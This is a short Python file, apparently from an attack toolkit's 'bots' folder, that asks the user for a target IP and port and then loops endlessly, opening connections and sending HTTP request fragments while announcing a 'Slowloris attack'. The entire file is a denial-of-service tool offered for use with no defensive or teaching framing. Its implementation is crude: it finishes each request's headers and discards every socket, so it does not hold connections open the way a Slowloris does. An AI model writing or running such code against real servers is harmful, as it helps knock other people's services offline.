# bots/slowloris.py
import socket
import time

def start_slowloris():
    ip = input("[?] Target IP: ")
    port = int(input("[?] Port: "))
    print(f"[+] Starting Slowloris attack on {ip}:{port}")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {ip}\r\n\r\n".encode("utf-8"))
            time.sleep(10)
        except:
            pass
